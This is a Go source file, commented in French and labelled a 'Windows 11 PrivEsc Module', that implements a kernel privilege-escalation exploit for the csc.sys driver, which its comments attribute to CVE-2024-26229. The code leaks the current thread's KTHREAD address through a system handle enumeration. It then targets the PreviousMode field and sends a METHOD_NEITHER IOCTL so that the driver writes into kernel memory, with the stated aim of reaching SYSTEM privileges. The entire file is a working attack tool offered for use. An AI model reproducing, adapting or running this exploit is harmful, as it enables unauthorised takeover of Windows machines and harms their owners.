//go:build windows

package main

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

// --- CONSTANTES ET STRUCTURES WINDOWS ---

const (
	SystemExtendedHandleInformation = 0x40
	ThreadBasicInformation          = 0
	IOCTL_CSC_USER_QUERY_DATABASE   = 0x225890
)

type CLIENT_ID struct {
	UniqueProcess uintptr
	UniqueThread  uintptr
}

type THREAD_BASIC_INFORMATION struct {
	ExitStatus     uint32
	TebBaseAddress uintptr
	ClientId       CLIENT_ID
	AffinityMask   uintptr
	Priority       int32
	BasePriority   int32
}

type SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX struct {
	Object                uintptr
	UniqueProcessId       uintptr
	HandleValue           uintptr
	GrantedAccess         uint32
	CreatorBackTraceIndex uint16
	ObjectTypeIndex       uint16
	HandleAttributes      uint32
	Reserved              uint32
}

type SYSTEM_HANDLE_INFORMATION_EX struct {
	NumberOfHandles uintptr
	Reserved        uintptr
	Handles         [1]SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
}

var (
	ntdll    = syscall.NewLazyDLL("ntdll.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")

	procNtQuerySystemInformation = ntdll.NewProc("NtQuerySystemInformation")
	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")
	procGetCurrentProcessId      = kernel32.NewProc("GetCurrentProcessId")
	procGetCurrentThreadId       = kernel32.NewProc("GetCurrentThreadId")
	procDeviceIoControl          = kernel32.NewProc("DeviceIoControl")
	procCreateFile               = kernel32.NewProc("CreateFileW")
)

// --- LOGIQUE D'EXPLOITATION ---

// GetCurrentThreadKThreadAddress récupère l'adresse du KTHREAD actuel via Search & Compare
func GetCurrentThreadKThreadAddress() (uintptr, error) {
	myPid, _, _ := procGetCurrentProcessId.Call()
	myTid, _, _ := procGetCurrentThreadId.Call()

	// STATUS_INFO_LENGTH_MISMATCH (0xC0000004)
	const STATUS_INFO_LENGTH_MISMATCH = 0xC0000004

	// 1. Récupération de tous les handles du système avec boucle de redimensionnement
	var returnLength uint32
	bufferSize := uint32(0x100000) // 1 Mo initial
	var buffer []byte
	var ret uintptr

	for {
		buffer = make([]byte, bufferSize)
		ret, _, _ = procNtQuerySystemInformation.Call(
			uintptr(SystemExtendedHandleInformation),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(bufferSize),
			uintptr(unsafe.Pointer(&returnLength)),
		)

		if ret == 0 {
			break // Succès
		}

		if uint32(ret) != STATUS_INFO_LENGTH_MISMATCH {
			return 0, fmt.Errorf("NtQuerySystemInformation failure: 0x%x", ret)
		}

		// On ajuste la taille + un extra pour éviter les variations
		bufferSize = returnLength + 0x10000
	}

	info := (*SYSTEM_HANDLE_INFORMATION_EX)(unsafe.Pointer(&buffer[0]))
	handleCount := uintptr(info.NumberOfHandles)
	startOfHandles := uintptr(unsafe.Pointer(&info.Handles[0]))
	handleSize := unsafe.Sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX{})

	fmt.Printf("[*] Scan de %d handles système...\n", handleCount)

	for i := uintptr(0); i < handleCount; i++ {
		handle := (*SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)(unsafe.Pointer(startOfHandles + i*handleSize))

		// On ne traite que les handles qui appartiennent à notre processus
		if handle.UniqueProcessId == myPid {
			var tbi THREAD_BASIC_INFORMATION
			// On interroge Windows : "Dis moi qui se cache derrière ce handle"
			res, _, _ := procNtQueryInformationThread.Call(
				handle.HandleValue,
				uintptr(ThreadBasicInformation),
				uintptr(unsafe.Pointer(&tbi)),
				unsafe.Sizeof(tbi),
				0,
			)

			// Si c'est un handle de thread et que son ID est le nôtre
			if res == 0 && tbi.ClientId.UniqueThread == myTid {
				return handle.Object, nil
			}
		}
	}

	return 0, fmt.Errorf("KTHREAD introuvable (les adresses noyau sont peut-être masquées par VBS)")
}

// ExploitCSCSys réalise l'élévation via CVE-2024-26229
func ExploitCSCSys() bool {
	fmt.Println("[*] Lancement de l'exploit v5.0 (CSC.sys Brute Force Leak)...")

	// 1. Leak de l'adresse KTHREAD
	kThreadAddr, err := GetCurrentThreadKThreadAddress()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return false
	}
	fmt.Printf("[+] KTHREAD localisé à : 0x%x\n", kThreadAddr)

	// 2. Cible (PreviousMode)
	targetAddr := kThreadAddr + 0x232
	fmt.Printf("[*] Target (PreviousMode): 0x%x\n", targetAddr)

	// 3. Ouverture du device CSC (Chemins multiples + Diagnostic d'erreur)
	names := []string{"\\\\.\\Csc", "\\\\.\\GLOBALROOT\\Device\\Csc"}
	var hDevice uintptr
	var errOpen error

	for _, name := range names {
		devName, _ := syscall.UTF16PtrFromString(name)
		// On capture l'erreur retournée par l'appel système
		h, _, e := procCreateFile.Call(
			uintptr(unsafe.Pointer(devName)),
			0,
			syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE|syscall.FILE_SHARE_DELETE,
			0,
			syscall.OPEN_EXISTING,
			0,
			0,
		)
		if h != uintptr(syscall.InvalidHandle) {
			hDevice = h
			fmt.Printf("[+] Device ouvert via : %s\n", name)
			break
		}
		errOpen = e
	}

	if hDevice == uintptr(syscall.InvalidHandle) {
		// Conversion de l'erreur en code système Windows
		errno := uint32(errOpen.(syscall.Errno))
		fmt.Printf("[-] Erreur système d'ouverture : %d\n", errno)

		switch errno {
		case 5:
			fmt.Println("[!] ACCÈS REFUSÉ : Les permissions (ACL) sur ce driver sont restreintes sur cette build.")
		case 2:
			fmt.Println("[!] INTROUVABLE : Le service Offline Files n'expose pas de canal de communication.")
		default:
			fmt.Println("[!] ERREUR INCONNUE : Le driver refuse la communication.")
		}
		return false
	}
	defer syscall.CloseHandle(syscall.Handle(hDevice))

	// 4. Trigger IOCTL (METHOD_NEITHER Corruption)
	var dummy uint32
	fmt.Println("[*] Déclenchement de la corruption du noyau...")
	procDeviceIoControl.Call(
		hDevice,
		uintptr(IOCTL_CSC_USER_QUERY_DATABASE),
		0, 0,
		targetAddr, 0, // On utilise targetAddr en output buffer pour forcer l'écriture de zero
		uintptr(unsafe.Pointer(&dummy)),
		0,
	)

	fmt.Println("[*] Vérification des nouveaux privilèges...")
	return CheckAdmin()
}

func CheckAdmin() bool {
	f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err == nil {
		f.Close()
		return true
	}
	return false
}

func main() {
	fmt.Println("--- Windows 11 PrivEsc Module (MSC2 Project) ---")
	if CheckAdmin() {
		fmt.Println("[+] Session déjà élevée.")
		return
	}

	if ExploitCSCSys() {
		fmt.Println("[+] SUCCÈS : Privilèges SYSTEM obtenus.")
	} else {
		fmt.Println("[-] Échec de l'élévation sur cette configuration.")
	}
}
